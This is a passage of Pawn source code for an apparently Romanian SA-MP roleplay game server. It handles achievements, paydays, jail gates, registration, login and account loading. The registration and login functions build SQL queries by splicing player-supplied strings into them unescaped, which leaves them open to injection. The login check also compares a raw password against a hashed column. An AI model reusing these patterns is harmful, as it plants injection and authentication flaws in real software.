		PlayerInfo[playerid][pAchievementStatus][30], PlayerInfo[playerid][pAchievementStatus][31], PlayerInfo[playerid][pAchievementStatus][32], PlayerInfo[playerid][pAchievementStatus][33], PlayerInfo[playerid][pAchievementStatus][34],
		PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);	
	return true;
}
stock givePoints(playerid, bpoints, gift=0) {
	gString[0] = EOS;
	switch(gift&&bpoints?2:gift?1:0) {
		case 0: {
			PlayerInfo[playerid][pBPoints] += bpoints;
			format(gString, 150, "(+) BPoints was modified: +%d (total: %s).", bpoints, FormatNumber(PlayerInfo[playerid][pBPoints]));
			SendClientMessage(playerid, COLOR_GREEN, gString);
			format(gString, 150, "congratulations!~n~you received ~p~%d BPoints ~n~~w~~h~total: ~r~~h~%s BPoints", bpoints, FormatNumber(PlayerInfo[playerid][pBPoints]));
			UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);			
		}
		case 1: {
			PlayerInfo[playerid][pGiftPoints] += gift;
			if(PlayerInfo[playerid][pGiftPoints]>(PlayerInfo[playerid][pVip] != 3 ? 2000 : 3000)) PlayerInfo[playerid][pGiftPoints]=PlayerInfo[playerid][pVip] != 3 ? 2000 : 3000;
			format(gString, 150, "[+] gift points was modified: +%d (total: %s).", gift, FormatNumber(PlayerInfo[playerid][pGiftPoints]));
			SendClientMessage(playerid, COLOR_GREEN, gString);
			format(gString, 150, "congratulations!~n~you received ~y~%d gift points~n~~w~~h~total: ~r~%s gift points", gift, FormatNumber(PlayerInfo[playerid][pGiftPoints]));
			UpdateVar(playerid, "GiftPoints", PlayerInfo[playerid][pGiftPoints]);
		}
		default: {
			PlayerInfo[playerid][pGiftPoints] += gift;
			PlayerInfo[playerid][pBPoints] += bpoints;
			if(PlayerInfo[playerid][pGiftPoints]>(PlayerInfo[playerid][pVip] != 3 ? 2000 : 3000)) PlayerInfo[playerid][pGiftPoints]=PlayerInfo[playerid][pVip] != 3 ? 2000 : 3000;
			format(gString, 150, "[+] BPoints and gift points was modified: +%d (total: %s) / +%d (total: %s).", bpoints, FormatNumber(PlayerInfo[playerid][pBPoints]), gift, FormatNumber(PlayerInfo[playerid][pGiftPoints]));
			SendClientMessage(playerid, COLOR_GREEN, gString);
			format(gString, 150, "congratulations!~n~you received ~p~%d BPoints ~w~~h~and ~y~%d gift points~n~~w~~h~total: ~r~~h~%s BPoints ~w~~h~and ~r~%s gift points", bpoints, gift, FormatNumber(PlayerInfo[playerid][pBPoints]), FormatNumber(PlayerInfo[playerid][pGiftPoints]));
			UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);
			UpdateVar(playerid, "GiftPoints", PlayerInfo[playerid][pGiftPoints]);			
		}
	}
	PlayerTextDrawSetString(playerid, InfoPTD, gString);
	PlayerTextDrawShow(playerid, InfoPTD);
	TimerInfo[playerid] = gettime()+6;
	return true;
}
stock finishAchievement(playerid, id) {
	if(PlayerInfo[playerid][pAchievementStatus][id] == 1) return true;
	PlayerInfo[playerid][pAchievementStatus][id] = 1;
	SaveAchievements(playerid);

	new money = 25000 + random(5000);
	GivePlayerCash(playerid, money);
	UpdateVar(playerid, "Respect", ++PlayerInfo[playerid][pExp]);
	
	gString[0] = (EOS);
	format(gString, 186, "(Achievement unlocked): {FFFFFF}Felicitari! Realizarea '%s' a fost deblocata.", achievementNames(id));
	SendClientMessage(playerid, 0xc3ff00FF, gString);

	format(gString, 128, "~n~Achievement unlocked!~n~~y~\"%s\"~n~~w~~h~you received: $%s, 1 RP~n~", achievementNames(id), FormatNumber(money));
	PlayerTextDrawSetString(playerid, InfoPTD, gString);
	PlayerTextDrawShow(playerid, InfoPTD);
	TimerInfo[playerid] = gettime()+5;
	PlayerInfo[playerid][pBPoints] += 10;
	PlayerInfo[playerid][pGiftPoints] += 50;
	if(PlayerInfo[playerid][pGiftPoints] > 2000) PlayerInfo[playerid][pGiftPoints] = 2000;
	SCMf(playerid, COLOR_MONEY, "(+) BPoints and gift points was modified: +10 (total: %d) / +50 (total: %d)", PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pGiftPoints]);
	return true;
}
redist::OpenCells() {
	new Float: Pos[3];
	for(new i = 0; i < 12; i++) {
		GetDynamicObjectPos(JailGate[i], Pos[0], Pos[1], Pos[2]);
		MoveDynamicObject(JailGate[i], Pos[0], Pos[1], Pos[2]-5, 2);
	}
	return true;
}
redist::CloseCells() {
	new Float: Pos[3];
	for(new i = 0; i < 12; i++) {
		GetDynamicObjectPos(JailGate[i], Pos[0], Pos[1], Pos[2]);
		MoveDynamicObject(JailGate[i], Pos[0], Pos[1], 1770.986938, 2);
	}
	return true;
}
redist::LVPDGates(id) {
	switch(id) {
		case 1: MoveDynamicObject(gatelvpd[0], 2293.85132, 2497.67554, 4.53215, 5);
		case 2: MoveDynamicObject(gatelvpd[1], 2335.20093, 2443.69922, 7.23391, 5);
		case 3: MoveDynamicObject(gatelvpd[2], 2238.21460, 2450.26953, 10.69610,  1, 0.00000, 90.00000, 90.00000);		
	}
	return true;
}	

task SyncUp[60000]() {
	new query[256], tmphour, tmpminute, hour, Year, Month, Day, minn, tmpsecond, sec;
	gettime(hour,minn,sec);
	gettime(tmphour, tmpminute, tmpsecond);
	getdate(Year, Month, Day);	

	if(!(tmpminute%10)) OpenCells();
	else CloseCells();

	FixHour(tmphour);
	
	if(hour==7&&!tmpminute) {
    	ResetQuest();
    	#if defined QUEST_AUTUMN 
    		resetSpecialQuest();
    	#endif
   		laserStock[0] = laserStock[1] = 2;
    }

    if(GetWeekDay()==Luni&&!hour&&!tmpminute) {
		_query("UPDATE `users` SET `ConnectedMonth` = '0.0', `Stucks` = '0', `Cheaters` = '0', `A_DM` = '0', `Complaints` = '0', `HelpedPlayersToday` = '0'", -1);
		foreach(new i : logged_players) PlayerInfo[i][pHelpedPlayersToday] = 0, PlayerInfo[i][pConnectMonth] = 0.0;
	}

	//top workers
	if(GetWeekDay()==Vineri&&hour==20&&!tmpminute) {
		foreach(new i : logged_players) {
			SendClientMessage(i, -1, "debug");
		}
	}
	//lotto
	if(GetWeekDay()==Marti&&hour==20&&minn==30||GetWeekDay()==Joi&&hour==20&&minn==30||GetWeekDay()==Sambata&&hour==20&&minn==30||GetWeekDay()==Duminica&&hour==20&&minn==30) {
		lotto_choose();
	}
    
	tmphour = shifthour;
	if((tmphour > ghour) || (tmphour == 0 && ghour == 23)) {	
	    if(hour == 00 && tmpminute == 0) {		
			if(Day == 1) {
				mysql_format(SQL, query, sizeof(query), "UPDATE `users` SET `HoursMonth`='0'");
				mysql_tquery(SQL, query, "", "");	
			
			}
	
			for(new i = 0; i < MAX_CLANS; i++) {
				if(ClanInfo[i][clDays] > 0) {
					ClanInfo[i][clDays] --;
					mysql_format(SQL, query, sizeof(query), "UPDATE `clans` SET `Days`='%d' WHERE `ID`='%d'", ClanInfo[i][clDays], i);
					mysql_tquery(SQL, query, "", "");
					if(ClanInfo[i][clDays] == 0) return true;
				}
			}
			
			_query("UPDATE `users` SET `Days`=`Days`+1 WHERE `Member`>'0'", -1);
			_query("UPDATE `users` SET `ClanDays`=`ClanDays`+1 WHERE `Clan`>'0'",-1);
		 	_query("UPDATE `users` SET `HelpedPlayersToday`='0' WHERE `Helper`>='1'", -1);
			
	        foreach(new i : logged_players) {
				if(PlayerInfo[i][pDailyLogin] == 1) PlayerInfo[i][pDailyLogin] = 0;
				if(PlayerInfo[i][pMember] != 0) PlayerInfo[i][pDays] ++;
				
				if(PlayerInfo[i][pHelper] != 0) PlayerInfo[i][pHelpedPlayersToday] = 0;
	        }	
	    }
		ghour = tmphour;
		if(realtime) SetWorldTimeEx(hour);
	}
	return true;
}

IsPlayerInArea(playerid, Float:MinX, Float:MinY, Float:MaxX, Float:MaxY) {
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	if(X>=MinX&&X<=MaxX&&Y>=MinY&&Y<= MaxY) return true;
	return false;
}

redist::IsPlayerInTurf(playerid, turfid) return IsPlayerOnTurf[playerid]==turfid?true:false;
new const pet_money[] = {0, 10000,15000,20000,25000,30000,35000,40000,45000,50000,55000,60000,65000,70000,75000,80000,85000,90000,95000,100000,150000,150000,175000,180000,190000,200000,210000,220000,230000,240000,250000};

cmd:payday(playerid) {
	if(!IsAdmin(playerid, 7))
		return true;

	PayDay();
	return true;
}

redist::reset_payday() return (Float_payday=false);
stock PayDay() {
	if(Float_payday) return true;
	new hour,minn,sec, year, month, day, interest, rent,gp,bp,pet,tax; gString[0] = EOS;
	getdate(year, month, day);
	gettime(hour,minn,sec);
	Float_payday=true;
	SetTimer("reset_payday", minn < 2 ? 100000 : 100, false);
	if(hour == 0) {
		foreach(new idd: All(MyVehicle<>)) CarInfo[idd][Dayss] ++;
		mysql_tquery(SQL, "UPDATE cars SET days = days+1");
	}

	new Float:int=0.2, max_rob,bonus_skin,skin_rp,skin_pp,skin_gp,skin_pet,skin_bp,Float:skin_bp2, Float:connected;

	foreach(new i : logged_players) {
		gp=0,bp=0,pet=0,bonus_skin=0,skin_rp=0,skin_pp=0,skin_gp=0,skin_pet=0,skin_bp=0,connected=0.0,tax=0,interest=0;
		new checks;
		for(new pd=0;pd<payday_power;++pd) {
			checks += (PlayerInfo[i][pLevel]*30000)+random(3000) + ((floatround(PlayerInfo[i][pSeconds]/3600))*9);

			switch(PlayerInfo[i][pPremiumAccount]+_:(PlayerInfo[i][pVip]==3)) {
				case 0: int=0.1,max_rob=8;
				case 1: int=0.2,max_rob=8;
				case 2: int=0.3, max_rob=15;
				case 3: int=0.4, max_rob=30;
			}
			interest += floatround(p_Procent(_:ByteVar2@bank[i], int));
			if(ByteVar1@bank[i]) interest += floatround(p_Procent(_:ByteVar1@bank[i] * 1000, int)) * 1000000;
			PlayerInfo[i][pExp] ++;
			tax +=2000;
			PlayerInfo[i][pRob] = PlayerInfo[i][pRob] < max_rob ? PlayerInfo[i][pRob] + 2 : max_rob;	
			if(IsACop(i) && PlayerInfo[i][pLawyer] < 10) PlayerInfo[i][pLawyer] ++;
			if(PlayerInfo[i][pEscapePoints] < 20) PlayerInfo[i][pEscapePoints] ++;		
			if(PlayerInfo[i][pSeconds]>=1800) {
				if(PlayerInfo[i][pFpunish] > 0) PlayerInfo[i][pFpunish]--;
				if(PlayerInfo[i][pCarLicS] > 0) PlayerInfo[i][pCarLicS] --;
				if(PlayerInfo[i][pGunLicS] > 0) PlayerInfo[i][pGunLicS] --;
				if(PlayerInfo[i][pFlyLicS] > 0) PlayerInfo[i][pFlyLicS] --;
				if(PlayerInfo[i][pBoatLicS] > 0) PlayerInfo[i][pBoatLicS] --;	
			}
			switch GetSkinRareCMD(PlayerInfo[i][pModel]) do {
				case SKIN_EPIC: { if(hour > 18 || hour < 22) skin_rp+=1; }
				case SKIN_LEGENDARY: bonus_skin+=50000,skin_rp+=1;
				case SKIN_MYTHIC: bonus_skin+=100000,skin_rp+=2;
				case SKIN_TRANSCENDENT: bonus_skin+=250000,skin_rp+=2;
				case SKIN_SUMMER: bonus_skin+=250000,skin_rp+=2;
				case SKIN_SUMMERV2: { skin_rp+=2; }
				case SKIN_PREMIUM,SKIN_PREMIUMV2: bonus_skin+=350000,skin_rp+=3,skin_pet+=100,skin_bp+=20,bp+=20,pet+=100;
				case SKIN_GIRL: skin_gp+=69;
				case SKIN_HALLOWEEN: { if(PlayerInfo[i][pSeconds] >= 1801) skin_pp += 1; }
				case SKIN_SPECIAL: { skin_bp2 = PlayerInfo[i][pSeconds]/60; }
			}
			if(PlayerInfo[i][pHouse] == 999) GivePlayerBank(i, interest+checks);
			else HouseInfo[PlayerInfo[i][pHouse]][hTakings] += 250 * PlayerInfo[i][pLevel], GivePlayerBank(i, (interest+checks)-(PlayerInfo[i][pLevel] * 250));

			connected += PlayerInfo[i][pSeconds]/3600, bp+=30, gp+=50, pet+=250;
			if(PlayerInfo[i][pDailyLogin] == 0) {
				checks += checks*2;
				PlayerInfo[i][pExp] ++;
				interest = interest*2;
				if(PlayerInfo[i][pPetLevel]>3) PlayerInfo[i][pExp]++;
				PlayerInfo[i][pDailyLogin] = 1;
			}
			if(PlayerInfo[i][pPetStatus]) GivePlayerCash(i, pet_money[PlayerInfo[i][pPetLevel]]);
		}
		SendClientMessage(i, COLOR_PAYDAY, "----------------------------------------------------------------------------");
		if(payday_power>1) {
			format(gString, sizeof gString, "%dx payday!", payday_power);
			SendClientMessageToAll(COLOR_YELLOW, gString);
		}
		SendClientMessage(i, -1, "Your paycheck has arrived; please visit the bank to withdraw your money.");
		SCMf(i, -1, "Ai primit %.2f ore jucate (%.0f minute).", connected, PlayerInfo[i][pSeconds]/60);
		//printf("%d", floatround(skin_bp2, floatround_round));
		GivePlayerCash(i,bonus_skin-tax);
		PlayerInfo[i][pExp] += skin_rp;
		PlayerInfo[i][pPremiumPoints] += skin_pp;
		PlayerInfo[i][pGiftPoints] += skin_gp;
		if(GetSkinRareCMD(PlayerInfo[i][pModel]) == SKIN_SPECIAL) PlayerInfo[i][pBPoints] += floatround(skin_bp2, floatround_round);
		else PlayerInfo[i][pBPoints] += skin_bp;
		UpdateProgress(i, 0);
		switch GetSkinRareCMD(PlayerInfo[i][pModel]) do {
			case SKIN_EPIC: if(hour > 18 || hour < 22) SCMf(i, COLOR_LIGHTGOLD, "Ai primit %dx RP la acest payday deoarece detii un epic skin si ai jucat in intervalul 18:00 - 22:00.", skin_rp);
			case SKIN_LEGENDARY: SCMf(i, COLOR_LIGHTGOLD, "Ai primit %dx RP si $%s deoarece detii un skin legendar.", skin_rp, FormatNumber(bonus_skin));
			case SKIN_MYTHIC: SCMf(i, COLOR_LIGHTGOLD, "Ai primit %dx RP si $%s deoarece detii un skin mythic.", skin_rp, FormatNumber(bonus_skin));
			case SKIN_TRANSCENDENT: SCMf(i, COLOR_LIGHTGOLD, "Ai primit %dx RP si $%s deoarece detii un skin transcendent.", skin_rp, FormatNumber(bonus_skin));
			case SKIN_SUMMER: SCMf(i, COLOR_LIGHTGOLD, "Ai primit %dx RP si $%s deoarece detii un skin summer.", skin_rp, FormatNumber(bonus_skin));
			case SKIN_SUMMERV2: SCMf(i, COLOR_LIGHTGOLD, "Ai primit %dx RP deoarece detii un skin summer v2.", skin_rp);
			case SKIN_HALLOWEEN: if(PlayerInfo[i][pSeconds] >= 1801) SendClientMessage(i, COLOR_LIGHTGOLD, "Halloween Skin: +1 premium point(s).");
			case SKIN_GIRL: if(PlayerInfo[i][pSeconds] >= 1801) SendClientMessage(i, COLOR_LIGHTGOLD, "Ai primit 69 gift points deoarece detii un skin girl.");
			case SKIN_SPECIAL: SCMf(i, COLOR_LIGHTGOLD, "Special Skin: Ai primit %.0f BPoints deoarece ai jucat %.0f minute.", skin_bp2, PlayerInfo[i][pSeconds]/60);
		}
		//givePoints(i, bp, gp);
		//givePetPoint(i, pet);
		PlayerInfo[i][pConnectTime] += connected;
		PlayerInfo[i][pConnectMonth] += connected;
		PlayerInfo[i][pCarLicT] -= 1;
		PlayerInfo[i][pFlyLicT] -= 1;
		PlayerInfo[i][pBoatLicT] -= 1;
		PlayerInfo[i][pGunLicT] -= 1;
		if(PlayerInfo[i][pDailyLogin] == 0) SendClientMessage(i, COLOR_BLUE, "Ai primit la acest payday mai multi bani si mai multe RP-uri deoarece e primul tau payday de astazi!");
		if(PlayerInfo[i][pPetStatus]) SCMf(i, COLOR_LIGHTGOLD, "Pet Benefits: You got $%s!", FormatNumber(pet_money[PlayerInfo[i][pPetLevel]]));
		if(PlayerInfo[i][pSpecialPet][5]==1) {
			PlayerInfo[i][pBPoints] += 135;
			SCMf(i, COLOR_LIGHTGOLD, "Ai primit 135 %s points deoarece detii un pet Palm.", serverInfo[sv_generalname]);
		}
		if(hour == 7) PlayerInfo[i][pDailyActivity] = 3600;
		if(PlayerInfo[i][pShowBanca] == 1) {
			format(gString, 45, "$%s", formatBytes(bank[i]));
			PlayerTextDrawSetString(i, BancaTD, gString);
		}
		new earnings=0;
		earnings=checks+interest;
		SCMf(i, COLOR_GREY, "Paycheck: $%s | Bank Balance: $%s | Bank interest: $%s | Tax: %s", FormatNumber(checks), formatBytes(bank[i]), FormatNumber(interest), FormatNumber(tax));
		SCMf(i, COLOR_GREY, "Rent $%s | Total earnings: $%s", FormatNumber(rent), FormatNumber(earnings));
		PlayerInfo[i][pActivePaydays]++;
		UpdateVar(i, "ActivePaydays", PlayerInfo[i][pActivePaydays]);

		format(gString, 256, "~n~Paycheck: ~g~$%s~w~~n~Playing hours: +%.2f~n~Bank: $%s~n~Interest: $%s~n~Tax: ~r~-$%s~w~~n~Rent: -$%s~n~Total: $~g~%s", 
			FormatNumber(checks), connected, formatBytes(bank[i]), FormatNumber(interest), FormatNumber(tax), FormatNumber(rent), FormatNumber(earnings));
		PlayerTextDrawSetString(i, InfoEx[2], "PayDay");
		PlayerTextDrawSetString(i, InfoEx[0], gString);
		for(new l=0;l<3;l++) PlayerTextDrawShow(i, InfoEx[l]);
		TimerPayDay[i] = gettime()+30;

		mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `users` SET `CarLicS` = '%i', `FlyLicS` = '%i', `BoatLicS` = '%i', `GunLicS` = '%i', `EscapePoints` = '%i', `DailyLogin` = '1', `Respect` = '%i', `Bank` = '%s', `ConnectedMonth` = `ConnectedMonth` + '%f', `Rob` = '%i' WHERE `id` = '%i'", 
			PlayerInfo[i][pCarLicS], PlayerInfo[i][pFlyLicS], PlayerInfo[i][pBoatLicS], PlayerInfo[i][pGunLicS], PlayerInfo[i][pEscapePoints], PlayerInfo[i][pExp], valueBigInt(bank[i]), PlayerInfo[i][pSeconds]/3600, PlayerInfo[i][pRob], PlayerInfo[i][pSQLID]);
		mysql_tquery(SQL, gQuery);
		PlayerInfo[i][pSeconds] = 0.0;
		SendClientMessage(i, COLOR_PAYDAY, "----------------------------------------------------------------------------");
	}
	if(hour == 7) mysql_tquery(SQL, "UPDATE `users` SET `DailyActivity` = '0'");
	if(RestartPayday) {
		SCMTA(COLOR_CLIENT, "Server-ul a fost restartat! Va rugam sa reveniti.");
		GameModeExit();
	}	
	return true;
}
stock GetWeaponNameEx(id, name[], len) return format(name,len, "%s", GunNames[id]);

public OnRconLoginAttempt(ip[], password[], success) return BlockIpAddress(ip, 10 * 60 * 1000);

stock OnPlayerRegister(playerid, const string:password[]) {
	SHA256_PassHash(password, HASH_ALIAS, PlayerInfo[playerid][pKey], 65);
	new year, month, day, hour, minute, second; getdate(year, month, day), gettime(hour, minute, second);
	format(srsString, 128, "%d-%02d-%02d %02d:%02d:%02d", year, month, day, hour, minute, second);
	mysql_format(SQL, gQuery, sizeof gQuery, "INSERT INTO `users` (`name`,`name_and_tag`,`password`, `Age`, `Email`, `Model`, `RegisterDate`, `Referral`) VALUES ('%s','%s','%s', '%i', '%s', '%d', '%s', '%i')",GetName(playerid), GetName(playerid), PlayerInfo[playerid][pKey], PlayerInfo[playerid][pAge], PlayerInfo[playerid][pEmail], PlayerInfo[playerid][pModel], srsString, PlayerInfo[playerid][pReferral]);
	mysql_tquery(SQL, gQuery, "register_account", "i", playerid);
	return true;
}

redist::register_account(playerid) {
	++ServerAccounts;
	format(gString, 128, "New Account: %s(%d) [#%d]", GetName(playerid), playerid, cache_insert_id());
	SendAdminMessage(COLOR_RED, gString, 1);
	for(new i=0;i<30;i++) SendClientMessage(playerid,-1,"");
	for(new i=0;i<7;i++) PlayerTextDrawDestroy(playerid, RegisterPTD[playerid][i]), PlayerTextID[playerid][PlayerText:RegisterPTD[playerid][i]] = -1;
	player_selected[playerid] = 0;
	for(new i = 0; i < 14; i++) TextDrawHideForPlayer(playerid, RegisterTD[i]);
	Camera(playerid);
	gPlayerLogTries[playerid] = 3;
	TextDrawShowForPlayer(playerid, LoginTD[0]);
	TextDrawShowForPlayer(playerid, LoginTD[1]);
	format(gString, 100, "Welcome, %s!\nPlease enter your password below to login your account.", GetName(playerid));
	ShowPlayerDialog(playerid, DIALOG_LOGIN2, DIALOG_STYLE_PASSWORD, "Account Registered", gString, "Login", "Quit");
	CancelSelectTextDraw(playerid);
	return true;
}

redist::GiveVehicleSpeed(i) {
    if(!IsPlayerInAnyVehicle(i)) return true;
    
    new
        vehicleid = GetPlayerVehicleID(i),
        spe = Carspeed(vehicleid),
        keys,
        Float:vx,
        Float:vy,
        Float:vz,
        carid = FindSpawnID(GetPlayerVehicleID(i))
    ;   

    GetPlayerKeys(i, keys, _:vx, _:vx);

    if(carid == -1) return true;

    if ((keys & (0b001000 | 0b100000 | KEY_HANDBRAKE)) == 0b001000) {
    	GetVehicleVelocity(vehicleid, vx, vy, vz);
	    if((spe>=5&&spe<24)&&CarInfo[carid][cStage]==4&&togLancher[i]&&DeelayCommand[i][25]<gettime()) {
	    	vx *= 10.000-(0.35*spe);
	    	vy *= 10.000-(0.35*spe);
	    	if (vz > 0.04 || vz < -0.04) vz -= 0.020;
	    	SetVehicleVelocity(vehicleid, vx, vy, vz);
	    	DeelayCommand[i][25] = gettime()+5;
	    	return true;
	    }
		if(spe>=GetVehicleSpeedUp(carid) || !togStage[i])
			return true;

	    if (vx * vx + vy * vy < 0.4 * 0.4) return true;


	    vx *= 1.025;
	    vy *= 1.025;


	    if (vz > 0.04 || vz < -0.04)
	        vz -= 0.020;

	    SetVehicleVelocity(vehicleid, vx, vy, vz);
	}
    return true;
}
stock OnPlayerLoginIn(playerid, const string:password[]) {
	if !compare(password,PlayerInfo[playerid][pKey]) *then {
		if !_:--gPlayerLogTries[playerid] *then
			return KickEx(playerid), SendClientMessage(playerid, COLOR_WARNING, "Parola incorecta! Incercarile au fost epuizate si ai primit kick."), 1;
		
		ShowPlayerDialog(playerid, DIALOG_LOGIN2,DIALOG_STYLE_PASSWORD,"Login", "Parola introdusa de tine este incorecta!\nIntrodu parola corecta altfel vei primi kick!","Login","Quit");				
		SCMf(playerid, COLOR_WARNING, "Parola incorecta! Mai ai la dispozitie %d incercari.", gPlayerLogTries[playerid]);
		return true;
	} 
	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name`='%s' AND `password`='%s' LIMIT 1", GetName(playerid), password);
	mysql_tquery(SQL, gQuery, "check_p_account", "i", playerid);
	return true;
}
redist::check_p_account(playerid) {
	if !cache_num_rows() *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: A aparut o problema de conectare!");
	Iter_Remove(LoginQueue<0>, playerid);
	TextDrawHideForPlayer(playerid, LoginTD[0]);
	TextDrawHideForPlayer(playerid, LoginTD[1]);
	GameTextForPlayer(playerid, "~g~ACCOUNT LOADING...", 3000,3);
            								
	cache_get_value_name(0, "PetName", PlayerInfo[playerid][pPetName]);                         					
	cache_get_value_name(0, "Email", PlayerInfo[playerid][pEmail]);	                          					                          					                      					
	cache_get_value_name(0, "crime", PlayerInfo[playerid][pCrime]);                          					                       					
                 						
	cache_get_value_name_int(0, "Hidden", PlayerInfo[playerid][pHidden]);
	cache_get_value_name_int(0, "Level", PlayerInfo[playerid][pLevel]);
	cache_get_value_name_int(0, "Leader", PlayerInfo[playerid][pLeader]);
	cache_get_value_name_int(0, "Admin", PlayerInfo[playerid][pAdmin]);
	cache_get_value_name_int(0, "Respect", PlayerInfo[playerid][pExp]);
	cache_get_value_name_int(0, "Youtuber", PlayerInfo[playerid][pYouTuber]);
	cache_get_value_name_int(0, "Backpack", PlayerInfo[playerid][pBackpack]);
	cache_get_value_name_int(0, "BackpackLevel", PlayerInfo[playerid][pBackpackLevel]);
	cache_get_value_name_int(0, "ShowBanca", PlayerInfo[playerid][pShowBanca]);
	cache_get_value_name_int(0, "ShowProgress1", PlayerInfo[playerid][pShowProgress][0]);
	cache_get_value_name_int(0, "ShowProgress2", PlayerInfo[playerid][pShowProgress][1]);
	cache_get_value_name_int(0, "ShowProgress3", PlayerInfo[playerid][pShowProgress][2]);
	cache_get_value_name_int(0, "ShowProgress4", PlayerInfo[playerid][pShowProgress][3]);
	cache_get_value_name_int(0, "ShowProgress5", PlayerInfo[playerid][pShowProgress][4]);
	cache_get_value_name_int(0, "Tutorial", PlayerInfo[playerid][pTutorial]);
	cache_get_value_name_int(0, "PetLevel", PlayerInfo[playerid][pPetLevel]);
	cache_get_value_name_bool(0, "PetStatus", PlayerInfo[playerid][pPetStatus]);
	cache_get_value_name_int(0, "PetPoints", PlayerInfo[playerid][pPetPoints]);
	cache_get_value_name_int(0, "Pet", PlayerInfo[playerid][pPet]);
	cache_get_value_name_bool(0, "Tester", PlayerInfo[playerid][pTester]);
	cache_get_value_name_bool(0, "Responsabil", PlayerInfo[playerid][pResponsabil]);
	cache_get_value_name_int(0, "JobOwner", PlayerInfo[playerid][pJobOwner]);
	cache_get_value_name_int(0, "Credit", PlayerInfo[playerid][pCredit]);
	cache_get_value_name_int(0, "DM", PlayerInfo[playerid][pDM]);
	cache_get_value_name_int(0, "Vip", PlayerInfo[playerid][pVip]);
	cache_get_value_name_int(0, "Helper", PlayerInfo[playerid][pHelper]);
	cache_get_value_name_int(0, "Premium", PlayerInfo[playerid][pPremiumAccount]);
	cache_get_value_name_float(0, "ConnectedTime", PlayerInfo[playerid][pConnectTime]);
	cache_get_value_name_float(0, "ConnectedMonth", PlayerInfo[playerid][pConnectMonth]);
	cache_get_value_name_int(0, "CasinoCredit", PlayerInfo[playerid][pCasinoCredit]);
	cache_get_value_name_int(0, "Sex", PlayerInfo[playerid][pSex]);
	cache_get_value_name_int(0, "Age", PlayerInfo[playerid][pAge]);
	cache_get_value_name_int(0, "DailyActivity", PlayerInfo[playerid][pDailyActivity]);
	cache_get_value_name_int(0, "Muted", PlayerInfo[playerid][pMuted]);
	cache_get_value_name_int(0, "MuteTime", PlayerInfo[playerid][pMuteTime]);
	cache_get_value_name_int(0, "goal", PlayerInfo[playerid][pJobGoal]);
	cache_get_value_name_int(0, "WantedDeaths", PlayerInfo[playerid][pWantedDeaths]);
	cache_get_value_name_int(0, "Phonebook", PlayerInfo[playerid][pPhoneBook]);
	cache_get_value_name_int(0, "WantedLevel", PlayerInfo[playerid][pWantedLevel]);
	cache_get_value_name_int(0, "Job", PlayerInfo[playerid][pJob]);
	cache_get_value_name_int(0, "Jailed", PlayerInfo[playerid][pJailed]);
	cache_get_value_name_int(0, "JailTime", PlayerInfo[playerid][pJailTime]);
	cache_get_value_name_int(0, "Materials", PlayerInfo[playerid][pMats]);
	cache_get_value_name_int(0, "Drugs", PlayerInfo[playerid][pDrugs]);
	cache_get_value_name_int(0, "Member", PlayerInfo[playerid][pMember]);
	cache_get_value_name_int(0, "Rank", PlayerInfo[playerid][pRank]);
	cache_get_value_name_int(0, "Fireworks", PlayerInfo[playerid][pFireworks]);
	cache_get_value_name_int(0, "FWarn", PlayerInfo[playerid][pFACWarns]);
	cache_get_value_name_int(0, "FightStyle", PlayerInfo[playerid][pFightStyle]);
	cache_get_value_name_int(0, "FPunish", PlayerInfo[playerid][pFpunish]);
	cache_get_value_name_int(0, "Acceptpoints", PlayerInfo[playerid][pLawyer]);
	cache_get_value_name_int(0, "KeyEmote1", PlayerInfo[playerid][pKeyEmote][0]);
	cache_get_value_name_int(0, "KeyEmote2", PlayerInfo[playerid][pKeyEmote][1]);
	cache_get_value_name_int(0, "Model", PlayerInfo[playerid][pModel]);
	cache_get_value_name(0, "PhoneNr", PlayerInfo[playerid][pPhone]);
	cache_get_value_name_int(0, "ClanPP", PlayerInfo[playerid][pClanPP]);
	cache_get_value_name_int(0, "House", PlayerInfo[playerid][pHouse]);
	cache_get_value_name_int(0, "Bizz", PlayerInfo[playerid][pBizz]);
	cache_get_value_name_int(0, "Rob", PlayerInfo[playerid][pRob]);
	cache_get_value_name_int(0, "ClanMoney", PlayerInfo[playerid][pClanMoney]);
	cache_get_value_name_int(0, "CarLicT", PlayerInfo[playerid][pCarLicT]);
	cache_get_value_name_int(0, "CarLic", PlayerInfo[playerid][pCarLic]);
	cache_get_value_name_int(0, "FlyLicT", PlayerInfo[playerid][pFlyLicT]);
	cache_get_value_name_int(0, "FlyLic", PlayerInfo[playerid][pFlyLic]);
	cache_get_value_name_int(0, "BoatLicT", PlayerInfo[playerid][pBoatLicT]);
	cache_get_value_name_int(0, "BoatLic", PlayerInfo[playerid][pBoatLic]);
	cache_get_value_name_int(0, "GunLicT", PlayerInfo[playerid][pGunLicT]);
	cache_get_value_name_int(0, "GunLic", PlayerInfo[playerid][pGunLic]);
	cache_get_value_name_int(0, "Warnings", PlayerInfo[playerid][pWarns]);
	cache_get_value_name_int(0, "Rented", PlayerInfo[playerid][pRented]);
	cache_get_value_name_int(0, "Fuel", PlayerInfo[playerid][pFuel]);
	cache_get_value_name_int(0, "WTalkie", PlayerInfo[playerid][pWTalkie]);
	cache_get_value_name_int(0, "Lighter", PlayerInfo[playerid][pLighter]);
	cache_get_value_name_int(0, "Cigarettes", PlayerInfo[playerid][pCigarettes]);
	cache_get_value_name_int(0, "RaportExpire", PlayerInfo[playerid][pRaportTime]);
	cache_get_value_name_int(0, "FactionInactivity", PlayerInfo[playerid][pFactionInactivity]);
	cache_get_value_name_int(0, "free_request_inactivity", free_request_inactivity[playerid]);
	cache_get_value_name_int(0, "FactionSpawn", FactionSpawn[playerid]);
	cache_get_value_name_int(0, "delay_yo", delay_yo[playerid]);
	cache_get_value_name_int(0, "Radio2", PlayerInfo[playerid][pMP3]);
	cache_get_value_name_int(0, "WantedTime", WantedTime[playerid]);
	cache_get_value_name_int(0, "HudGen", PlayerInfo[playerid][pHudGen]);
	cache_get_value_name_int(0, "id", PlayerInfo[playerid][pSQLID]);
	cache_get_value_name_int(0, "Referral", PlayerInfo[playerid][pReferral]);
	cache_get_value_name_int(0, "ReferralRP", PlayerInfo[playerid][pReferralRP]);
